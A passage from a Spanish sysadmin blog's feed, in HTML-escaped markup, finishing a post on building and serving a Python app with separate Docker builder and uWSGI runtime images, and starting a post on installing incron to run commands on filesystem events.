&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;27&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;28&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing readline &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.3.008-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;30&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing sqlite-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.13.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;31&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing py-setuptools &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt;.8.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;33&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing py-pip &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.1.2-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;34&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing py-virtualenv &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;.0.1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;35&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing python-dev &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r9.trigger
Executing ca-certificates-20160104-r4.trigger
OK: &lt;span class="m"&gt;169&lt;/span&gt; MiB in &lt;span class="m"&gt;44&lt;/span&gt; packages
 ---&amp;gt; 86bd30dae926
Removing intermediate container 36ab40f2fbc6
Step &lt;span class="m"&gt;3&lt;/span&gt; : COPY build.sh /
 ---&amp;gt; bb87e7021b1f
Removing intermediate container d1c160839571
Step &lt;span class="m"&gt;4&lt;/span&gt; : ENTRYPOINT sh build.sh
 ---&amp;gt; Running in ec43f4786949
 ---&amp;gt; 9887ce973fe2
Removing intermediate container ec43f4786949
Successfully built 9887ce973fe2
gerard@sirius:~/docker/autobuilder/builder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta imagen no se va a reconstruir -en principio- nunca. Las diferentes ejecuciones van a producir diferentes productos.&lt;/p&gt;
&lt;h2&gt;La imagen de runtime&lt;/h2&gt;
&lt;p&gt;Esta imagen es todavía mas fácil; se trata de un servidor de aplicaciones estándar que va a servir la aplicación siguiendo las reglas descritas mas arriba.&lt;/p&gt;
&lt;p&gt;Vamos a asumir que tenemos el &lt;em&gt;bundle&lt;/em&gt; construido y llamado &lt;em&gt;app.tar.gz&lt;/em&gt;, así que solo faltaría descomprimirlo para que quede todo en &lt;em&gt;/app&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ cat Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache uwsgi-python
ADD app.tar.gz /
COPY app.ini /app/
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;uwsgi&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--ini&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/app/app.ini&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El fichero que va a servir la aplicación depende de cada servidor de aplicaciones, y de momento, nos vale un sencillo. En este punto se vuelve especialmente importante respetar las convenciones del &lt;em&gt;virtualenv&lt;/em&gt; y de la localización de la aplicación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ cat app.ini 
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
http-socket &lt;span class="o"&gt;=&lt;/span&gt; :8080
&lt;span class="nv"&gt;plugin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; python
&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /app/app/
&lt;span class="nv"&gt;virtualenv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /app/env/
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; app:app
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;La hora de la release&lt;/h2&gt;
&lt;p&gt;Ha llegado el momento de hacer una &lt;em&gt;release&lt;/em&gt;; así que vamos a hacer el &lt;em&gt;bundle&lt;/em&gt; y la imagen de servicio, para luego poder servirlo. Este paso se va a repetir muy a menudo, dependiendo de la política de &lt;em&gt;releases&lt;/em&gt; de vuestra compañía. Para obtener el &lt;em&gt;bundle&lt;/em&gt;, necesitamos compilar la referencia del repositorio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ docker run -ti --rm -e &lt;span class="s2"&gt;&amp;quot;REPO=https://github.com/Sirtea/autobuilder.git&amp;quot;&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;quot;REF=v1.0.0&amp;quot;&lt;/span&gt; -v /home/gerard/docker/autobuilder/runner/:/shared/ builder
Cloning into &lt;span class="s1"&gt;&amp;#39;/build&amp;#39;&lt;/span&gt;...
remote: Counting objects: &lt;span class="m"&gt;10&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
remote: Compressing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/9&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
remote: Total &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, pack-reused &lt;span class="m"&gt;0&lt;/span&gt;
Unpacking objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/10&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
Checking connectivity... &lt;span class="k"&gt;done&lt;/span&gt;.
New python executable in /app/env/bin/python
Installing setuptools, pip, wheel...done.
Collecting &lt;span class="nv"&gt;click&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.6 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading click-6.6.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;283kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 286kB 536kB/s 
Collecting &lt;span class="nv"&gt;Flask&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.11.1 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading Flask-0.11.1-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;80kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 81kB 809kB/s 
Collecting &lt;span class="nv"&gt;itsdangerous&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.24 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading itsdangerous-0.24.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;46kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 51kB 724kB/s 
Collecting &lt;span class="nv"&gt;Jinja2&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.8 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading Jinja2-2.8-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;263kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 266kB 861kB/s 
Collecting &lt;span class="nv"&gt;MarkupSafe&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.23 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading MarkupSafe-0.23.tar.gz
Collecting &lt;span class="nv"&gt;mongoengine&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.10.6 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading mongoengine-0.10.6.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;346kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 348kB 803kB/s 
Collecting &lt;span class="nv"&gt;pymongo&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.3.0 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;7&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading pymongo-3.3.0.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;494kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 501kB 753kB/s 
Collecting &lt;span class="nv"&gt;Werkzeug&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.11.10 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;8&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading Werkzeug-0.11.10-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;306kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 307kB &lt;span class="m"&gt;1&lt;/span&gt;.1MB/s 
Building wheels &lt;span class="k"&gt;for&lt;/span&gt; collected packages: click, itsdangerous, MarkupSafe, mongoengine, pymongo
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; click ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/b0/6d/8c/cf5ca1146e48bc7914748bfb1dbf3a40a440b8b4f4f0d952dd
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; itsdangerous ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/fc/a8/66/24d655233c757e178d45dea2de22a04c6d92766abfb741129a
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; MarkupSafe ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/a3/fa/dc/0198eed9ad95489b8a4f45d14dd5d2aee3f8984e46862c5748
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; mongoengine ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/ae/6d/cb/4573bb9aceaed483557761df59571c6a3f108e87a80d2ba03a
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; pymongo ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/bf/f7/14/6ed22fbc276fc2d9fa7cdb2235dea8d5f154d711dfdf4bdebe
Successfully built click itsdangerous MarkupSafe mongoengine pymongo
Installing collected packages: click, MarkupSafe, Jinja2, Werkzeug, itsdangerous, Flask, pymongo, mongoengine
Successfully installed Flask-0.11.1 Jinja2-2.8 MarkupSafe-0.23 Werkzeug-0.11.10 click-6.6 itsdangerous-0.24 mongoengine-0.10.6 pymongo-3.3.0
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Puesto que el &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;build.sh&lt;/em&gt; deja el fichero &lt;em&gt;.tar.gz&lt;/em&gt; en &lt;em&gt;/shared&lt;/em&gt;, y este es un volumen montado en la carpeta actual, vemos que nos aparece nuestro producto compilado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder$ tree
.
├── builder
│   ├── build.sh
│   └── Dockerfile
└── runner
    ├── app.ini
    ├── app.tar.gz
    └── Dockerfile

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;5&lt;/span&gt; files
gerard@sirius:~/docker/autobuilder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Efectivamente, este &lt;em&gt;bundle&lt;/em&gt; contiene la aplicación y el &lt;em&gt;virtualenv&lt;/em&gt; en la forma requerida, así que el siguiente paso es construir la imagen de &lt;em&gt;runtime&lt;/em&gt; con este &lt;em&gt;bundle&lt;/em&gt; incorporado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ docker build -t runner .
Sending build context to Docker daemon &lt;span class="m"&gt;5&lt;/span&gt;.027 MB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
 ---&amp;gt; 4e38e38c8ce0
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache uwsgi-python
 ---&amp;gt; Running in 9233d11f6646
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing mailcap &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.44-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.38-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing uwsgi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0.13-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing libbz2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.6-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing expat &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing libffi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.2.1-r2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing gdbm &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.11-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo-base &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing readline &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.3.008-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing sqlite-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.13.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing uwsgi-python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0.13-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r9.trigger
OK: &lt;span class="m"&gt;53&lt;/span&gt; MiB in &lt;span class="m"&gt;25&lt;/span&gt; packages
 ---&amp;gt; b7c2de7c84d1
Removing intermediate container 9233d11f6646
Step &lt;span class="m"&gt;3&lt;/span&gt; : ADD app.tar.gz /
 ---&amp;gt; 9b8046268ece
Removing intermediate container 0a5f930580a2
Step &lt;span class="m"&gt;4&lt;/span&gt; : COPY app.ini /app/
 ---&amp;gt; 345641630c11
Removing intermediate container 8b0fe594e89d
Step &lt;span class="m"&gt;5&lt;/span&gt; : ENTRYPOINT uwsgi --ini /app/app.ini
 ---&amp;gt; Running in 586c9d5f49ae
 ---&amp;gt; a83cfc054bdc
Removing intermediate container 586c9d5f49ae
Successfully built a83cfc054bdc
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestra imagen.&lt;/p&gt;
&lt;h2&gt;Ejecutando la imagen&lt;/h2&gt;
&lt;p&gt;Esta parte no tiene mucho misterio; basta con ejecutar la imagen como lo haríamos normalmente. Esta aplicación en concreto lee las configuraciones desde las variables de entorno, así que se las ponemos. En este caso particular, tenemos la imagen de &lt;strong&gt;Docker Hub&lt;/strong&gt; &lt;a href="https://hub.docker.com/_/mongo/"&gt;mongo&lt;/a&gt; en la dirección &lt;em&gt;IP&lt;/em&gt; indicada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ docker run -ti --rm -p &lt;span class="m"&gt;8888&lt;/span&gt;:8080 -e &lt;span class="s2"&gt;&amp;quot;MONGODB_URI=mongodb://172.17.0.2:27017/shop&amp;quot;&lt;/span&gt; runner
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que todo funciona lanzando una petición &lt;em&gt;HTTP&lt;/em&gt; estándar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://localhost:8888/
&amp;lt;h1&amp;gt;Fruits&amp;lt;/h1&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Apple&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;Orange&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;Pear&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora podemos ver que la imagen de &lt;em&gt;runtime&lt;/em&gt; queda mucho mas reducida, mas rápida de construir y sin tanto &lt;em&gt;bloat&lt;/em&gt;. Supongo que podemos reducir mas lo que ocupa la imagen seleccionando versiones de &lt;strong&gt;python&lt;/strong&gt; alternativas; el sistema operativo base son solo 4.8mb...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
runner              latest              e190cce7685a        &lt;span class="m"&gt;31&lt;/span&gt; seconds ago      &lt;span class="m"&gt;60&lt;/span&gt;.75 MB
builder             latest              edf62460d187        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       &lt;span class="m"&gt;164&lt;/span&gt; MB
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, la &lt;em&gt;cache&lt;/em&gt; de &lt;strong&gt;Docker&lt;/strong&gt; funciona a las mil maravillas en este caso; si hubiera que reconstruir la imagen de &lt;em&gt;runtime&lt;/em&gt;, se ejecutarían solo los pasos 3, 4 y 5. Esto convierte el hecho de "hacer una &lt;em&gt;release&lt;/em&gt;" en casi inmediato.&lt;/p&gt;</content><category term="docker"></category><category term="python"></category><category term="build"></category><category term="runtime"></category><category term="release"></category></entry><entry><title>Disparando acciones en respuesta a modificaciones en el sistema de fichero con incron</title><link href="http://www.linuxsysadmin.ml/2016/10/disparando-acciones-en-respuesta-a-modificaciones-en-el-sistema-de-fichero-con-incron.html" rel="alternate"></link><published>2016-10-03T08:00:00+02:00</published><updated>2016-10-03T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-10-03:/2016/10/disparando-acciones-en-respuesta-a-modificaciones-en-el-sistema-de-fichero-con-incron.html</id><summary type="html">&lt;p&gt;El otro día recibí una petición diferente en mi trabajo. Se necesitaba monitorizar una carpeta, de forma que cuando alguien dejara ficheros, se lanzara una tarea para procesarlos. Tras buscar un poco por internet, topé con una herramienta tipo &lt;em&gt;cron&lt;/em&gt;, que ejecutaba comandos ante eventos en el sistema de ficheros …&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día recibí una petición diferente en mi trabajo. Se necesitaba monitorizar una carpeta, de forma que cuando alguien dejara ficheros, se lanzara una tarea para procesarlos. Tras buscar un poco por internet, topé con una herramienta tipo &lt;em&gt;cron&lt;/em&gt;, que ejecutaba comandos ante eventos en el sistema de ficheros.&lt;/p&gt;
&lt;p&gt;Como me pareció interesante, me puse a investigar como funcionaba y, aunque no sirvió para cubrir nuestras necesidades, decidí apuntarla por sus usos potenciales en el futuro.&lt;/p&gt;
&lt;p&gt;Como no podía ser de otra forma, vamos a empezar instalando el paquete que lo contiene:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@65b056d5d699:~# apt-get install -y incron
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following NEW packages will be installed:
  incron
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;1&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;0&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;68&lt;/span&gt;.8 kB of archives.
After this operation, &lt;span class="m"&gt;321&lt;/span&gt; kB of additional disk space will be used.
...  
Processing triggers &lt;span class="k"&gt;for&lt;/span&gt; systemd &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;215&lt;/span&gt;-17+deb8u4&lt;span class="o"&gt;)&lt;/span&gt; ...
root@65b056d5d699:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Normalmente, los servicios se levantan solos en &lt;strong&gt;Debian&lt;/strong&gt;, pero como estamos trabajando con un contenedor &lt;strong&gt;docker&lt;/strong&gt; mediante &lt;strong&gt;SSH&lt;/strong&gt;, vamos a tener que hacerlo manualmente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@65b056d5d699:~# service incron start
&lt;span class="o"&gt;[&lt;/span&gt; ok &lt;span class="o"&gt;]&lt;/span&gt; Starting File system events scheduler: incron.
root@65b056d5d699:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta herramienta se puede configurar de forma similar al &lt;strong&gt;cron&lt;/strong&gt;; tenemos la opción de poner ficheros de configuración en &lt;em&gt;/etc/incron.d/&lt;/em&gt; o podemos usar comandos de &lt;strong&gt;incron&lt;/strong&gt; por usuario, mediante el comando &lt;em&gt;incron&lt;/em&gt;, con los flags correspondientes.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;incron -l&lt;/strong&gt; &amp;rarr; lista la tabla de incron del usuario actual&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;incron -e&lt;/strong&gt; &amp;rarr; edita la tabla de incron del usuario actual&lt;/li&gt;
